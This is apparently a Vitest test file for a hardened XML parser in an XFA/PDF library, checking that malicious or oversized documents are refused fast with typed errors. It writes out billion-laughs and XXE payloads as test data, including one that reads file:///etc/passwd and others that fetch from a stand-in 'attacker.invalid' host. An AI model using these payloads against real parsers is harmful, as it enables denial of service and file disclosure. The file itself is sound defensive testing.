import { describe, expect, it } from 'vitest';
import { XfaPdfError, type XfaPdfErrorCode } from '../../pdf/errors.js';
import {
  MAX_XML_ATTRIBUTE_CHARS,
  MAX_XML_ATTRIBUTES,
  MAX_XML_CHARS,
  MAX_XML_DEPTH,
  MAX_XML_ELEMENTS,
  MAX_XML_NAMESPACE_DECLARATIONS,
  MAX_XML_NODES,
} from '../limits.js';
import { parseXml } from '../parse.js';
import { serializeXml } from '../serialize.js';
import { countElements } from './structure.js';

/** A hostile document must be refused quickly: this is the wall-clock bound the card (A3) sets. */
const FAST_MS = 1000;
/** Bound for tests that PARSE successfully: generous so a loaded CI machine cannot flake them. */
const SLOW_OK_MS = 10_000;

function expectRefused(text: string, code: XfaPdfErrorCode, match?: RegExp): XfaPdfError {
  const started = performance.now();
  let caught: unknown;
  try {
    parseXml(text);
  } catch (e) {
    caught = e;
  }
  const elapsed = performance.now() - started;
  expect(caught, 'must throw a typed XfaPdfError, never RangeError/ParseError/TypeError').toBeInstanceOf(XfaPdfError);
  const err = caught as XfaPdfError;
  expect(err.code).toBe(code);
  if (match !== undefined) expect(err.message).toMatch(match);
  expect(elapsed, `took ${Math.round(elapsed)} ms`).toBeLessThan(FAST_MS);
  return err;
}

describe('parseXml rejects declarations before any parser sees them (XXE and entity expansion)', () => {
  it('a billion-laughs DOCTYPE with nested internal entities -> UNSUPPORTED_FEATURE (expansion would exhaust memory)', () => {
    const laughs = [
      '<?xml version="1.0"?>',
      '<!DOCTYPE lolz [',
      '<!ENTITY lol "lol">',
      '<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">',
      '<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">',
      '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">',
      ']>',
      '<lolz>&lol3;</lolz>',
    ].join('\n');
    expectRefused(laughs, 'UNSUPPORTED_FEATURE', /DOCTYPE/i);
  });

  it('an external SYSTEM entity pointing at a local file -> UNSUPPORTED_FEATURE (XXE file read)', () => {
    expectRefused('<!DOCTYPE a [<!ENTITY x SYSTEM "file:///etc/passwd">]><a>&x;</a>', 'UNSUPPORTED_FEATURE');
  });

  it('a PUBLIC/SYSTEM external DTD subset with no inline entities -> UNSUPPORTED_FEATURE (a fetch of an attacker URL)', () => {
    expectRefused('<!DOCTYPE a SYSTEM "http://attacker.invalid/x.dtd"><a/>', 'UNSUPPORTED_FEATURE');
  });

  it('a parameter entity declaration and a bare <!ENTITY outside any DOCTYPE -> UNSUPPORTED_FEATURE', () => {
    expectRefused('<!DOCTYPE a [<!ENTITY % p SYSTEM "http://attacker.invalid/p">%p;]><a/>', 'UNSUPPORTED_FEATURE');
    expectRefused('<a><!ENTITY x "y"></a>', 'UNSUPPORTED_FEATURE');
  });

  it.each(['<!ELEMENT a ANY>', '<!ATTLIST a k CDATA #IMPLIED>', '<!NOTATION n SYSTEM "x">', '<!doctype a>', '<!DocType a>'])(
    'the declaration %s is refused in any letter case (a case-folded check would miss one)',
    (decl) => {
      expectRefused(`${decl}<a/>`, 'UNSUPPORTED_FEATURE');
    },
  );

  it('an unknown <! construct that is not a comment or CDATA section -> MALFORMED_XML', () => {
    expectRefused('<a><!bogus></a>', 'MALFORMED_XML');
  });

  it('a DOCTYPE hidden behind a leading comment, PI and declaration is still found', () => {
    expectRefused('<?xml version="1.0"?><!-- c --><?pi x?><!DOCTYPE a [<!ENTITY x "y">]><a/>', 'UNSUPPORTED_FEATURE');
  });
});

describe('parseXml resource ceilings (each one stops a document that would exhaust CPU or memory)', () => {
  it('1,000,000 nested elements -> MALFORMED_XML within 1 s (an unbounded tree or recursive walk would overflow the stack)', () => {
    const text = '<a>'.repeat(1_000_000);
    expectRefused(text, 'MALFORMED_XML', /depth/i);
  });

  it('nesting exactly at the depth ceiling parses and one level deeper is refused', () => {
    const nest = (n: number): string => '<a>'.repeat(n) + '</a>'.repeat(n);
    expect(countElements(parseXml(nest(MAX_XML_DEPTH)))).toBe(MAX_XML_DEPTH);
    expectRefused(nest(MAX_XML_DEPTH + 1), 'MALFORMED_XML', /depth/i);
  });

  it('a self-closing element at the deepest level counts toward depth (it is a node a walker must visit)', () => {
    expectRefused('<a>'.repeat(MAX_XML_DEPTH) + '<b/>' + '</a>'.repeat(MAX_XML_DEPTH), 'MALFORMED_XML', /depth/i);
  });

  it('more elements than the element ceiling -> MALFORMED_XML within 1 s, counted before the tree is built', () => {
    expectRefused(`<r>${'<a/>'.repeat(MAX_XML_ELEMENTS)}</r>`, 'MALFORMED_XML', /element/i);
  });

  it('exactly the element ceiling parses', () => {
    const doc = parseXml(`<r>${'<a/>'.repeat(MAX_XML_ELEMENTS - 1)}</r>`);
    expect(countElements(doc)).toBe(MAX_XML_ELEMENTS);
  });

  it('an element with more attributes than the attribute ceiling -> MALFORMED_XML (attribute insertion cost grows with the count)', () => {
    const attrs = (n: number): string => Array.from({ length: n }, (_, i) => `a${i}="1"`).join(' ');
    expect(parseXml(`<r ${attrs(MAX_XML_ATTRIBUTES)}/>`).documentElement?.attributes.length).toBe(MAX_XML_ATTRIBUTES);
    expectRefused(`<r ${attrs(MAX_XML_ATTRIBUTES + 1)}/>`, 'MALFORMED_XML', /attribute/i);
  });

  it('an attribute value longer than the attribute-length ceiling -> MALFORMED_XML', () => {
    expect(parseXml(`<r k="${'x'.repeat(MAX_XML_ATTRIBUTE_CHARS)}"/>`).documentElement?.getAttribute('k')?.length).toBe(MAX_XML_ATTRIBUTE_CHARS);
    expectRefused(`<r k="${'x'.repeat(MAX_XML_ATTRIBUTE_CHARS + 1)}"/>`, 'MALFORMED_XML', /attribute/i);
  });

  it('too many namespace declarations across the document -> MALFORMED_XML (serialization cost is elements times in-scope declarations)', () => {
    // Declarations are attributes, so one element holds at most MAX_XML_ATTRIBUTES of them: spread the rest over nested elements.
    const nested = (total: number): string => {
      let open = '';
      let close = '';
      for (let done = 0, level = 0; done < total; done += MAX_XML_ATTRIBUTES, level++) {
        const count = Math.min(MAX_XML_ATTRIBUTES, total - done);
        open += `<e${level} ${Array.from({ length: count }, (_, i) => `xmlns:p${done + i}="urn:${done + i}"`).join(' ')}>`;
        close = `</e${level}>${close}`;
      }
      return `${open}${close}`;
    };
    expect(countElements(parseXml(nested(MAX_XML_NAMESPACE_DECLARATIONS)))).toBe(MAX_XML_NAMESPACE_DECLARATIONS / MAX_XML_ATTRIBUTES);
    expectRefused(nested(MAX_XML_NAMESPACE_DECLARATIONS + 1), 'MALFORMED_XML', /namespace/i);
    // Spread over many elements the total still counts.
    const spread = `<r>${Array.from({ length: MAX_XML_NAMESPACE_DECLARATIONS + 1 }, (_, i) => `<e xmlns:p${i}="urn:${i}"/>`).join('')}</r>`;
    expectRefused(spread, 'MALFORMED_XML', /namespace/i);
  });

  it('the default namespace declaration and prefixed ones both count, but ordinary xmlns-looking attribute names do not', () => {
    expect(countElements(parseXml(`<r xmlns="urn:d" xmlns:p="urn:p" myxmlns="1"/>`, { limits: { maxNamespaceDeclarations: 2 } }))).toBe(1);
    expect(() => parseXml('<r xmlns="urn:d" xmlns:p="urn:p"/>', { limits: { maxNamespaceDeclarations: 1 } })).toThrow(XfaPdfError);
  });

  it('input longer than the character ceiling is refused before scanning (a 50 MB packet must not reach the parser)', () => {
    const big = `<a>${'x'.repeat(MAX_XML_CHARS)}</a>`;
    expectRefused(big, 'MALFORMED_XML', /characters/i);
  });

  it('the tightened per-call limits apply (the same document passes under the defaults and fails under a smaller ceiling)', () => {
    const text = `<r>${'<a/>'.repeat(10)}</r>`;
    expect(countElements(parseXml(text))).toBe(11);
    expect(() => parseXml(text, { limits: { maxElements: 10 } })).toThrow(XfaPdfError);
    expect(() => parseXml(text, { limits: { maxDepth: 1 } })).toThrow(XfaPdfError);
    expect(() => parseXml(text, { limits: { maxChars: 20 } })).toThrow(XfaPdfError);
  });

  it('a document at the namespace-heavy worst case (all declarations in scope for every element, maximum elements) parses and serializes in under 10 s', () => {
    const levels = MAX_XML_NAMESPACE_DECLARATIONS / MAX_XML_ATTRIBUTES;
    let open = '';
    let close = '';
    for (let level = 0; level < levels; level++) {
      const decls = Array.from({ length: MAX_XML_ATTRIBUTES }, (_, i) => `xmlns:p${level}_${i}="urn:${level}:${i}"`).join(' ');
      open += `<e${level} ${decls}>`;
      close = `</e${level}>${close}`;
    }
    const text = `${open}${'<a/>'.repeat(MAX_XML_ELEMENTS - levels)}${close}`;
    const started = performance.now();
    const out = serializeXml(parseXml(text));
    const elapsed = performance.now() - started;
    expect(out.length).toBeGreaterThan(text.length - 1);
    expect(elapsed, `parse+serialize took ${Math.round(elapsed)} ms`).toBeLessThan(SLOW_OK_MS);
  });
});

describe('parseXml on structurally nasty but legal-looking input', () => {
  it('a million-character run of unclosed-tag text is refused without a quadratic scan', () => {
    expectRefused('<a>' + '<'.repeat(1_000_000), 'MALFORMED_XML');
  });

  it('a million-node ceiling: exactly MAX_XML_NODES sibling comments parse, one more is refused (memory is bounded by nodes, not only by elements)', () => {
    const started = performance.now();
    const doc = parseXml(`<a>${'<!---->'.repeat(MAX_XML_NODES - 1)}</a>`);
    expect(doc.documentElement?.childNodes.length).toBe(MAX_XML_NODES - 1);
    expect(performance.now() - started).toBeLessThan(SLOW_OK_MS);
    expectRefused(`<a>${'<!---->'.repeat(MAX_XML_NODES)}</a>`, 'MALFORMED_XML', /node/i);
  });

  it('a full-size document of empty comments (16 MiB of <!---->) is refused fast, before a tree of millions of nodes is built', () => {
    expectRefused(`<a>${'<!---->'.repeat(Math.floor((MAX_XML_CHARS - 16) / 7))}</a>`, 'MALFORMED_XML', /node/i);
  });

  it('the same with a text run before every comment (each text run is a node too)', () => {
    expectRefused(`<a>${'x<!---->'.repeat(Math.floor((MAX_XML_CHARS - 16) / 8))}</a>`, 'MALFORMED_XML', /node/i);
  });

  it('empty CDATA sections and processing instructions are nodes too', () => {
    expectRefused(`<a>${'<![CDATA[]]>'.repeat(Math.floor((MAX_XML_CHARS - 16) / 12))}</a>`, 'MALFORMED_XML', /node/i);
    expectRefused(`<a>${'<?p?>'.repeat(Math.floor((MAX_XML_CHARS - 16) / 5))}</a>`, 'MALFORMED_XML', /node/i);
  });

  it('attributes count toward the node ceiling: 4,000 elements with 256 short attributes each (about 8 MB, inside every other ceiling) is refused fast', () => {
    const attrs = Array.from({ length: MAX_XML_ATTRIBUTES }, (_, i) => `a${i.toString(36).padStart(2, '0')}="1"`).join(' ');
    const elements = Math.ceil(MAX_XML_NODES / (MAX_XML_ATTRIBUTES + 1)) + 1;
    const text = `<r>${`<e ${attrs}/>`.repeat(elements)}</r>`;
    expect(text.length).toBeLessThan(MAX_XML_CHARS);
    expect(elements).toBeLessThan(MAX_XML_ELEMENTS);
    expectRefused(text, 'MALFORMED_XML', /node/i);
  });

  it('elements and text runs together count toward the node ceiling even when the element ceiling is not reached', () => {
    const unit = 'x<b/>x<!---->x<!---->x<!---->';
    expectRefused(`<a>${unit.repeat(Math.ceil(MAX_XML_NODES / 7) + 1)}</a>`, 'MALFORMED_XML', /node/i);
  });

  it('repeated `<!--` that never closes is refused in linear time', () => {
    expectRefused('<a>' + '<!--'.repeat(250_000), 'MALFORMED_XML');
  });

  it('an unterminated start tag followed by a million quotes does not backtrack', () => {
    expectRefused('<a b="' + '"='.repeat(500_000), 'MALFORMED_XML');
  });
});
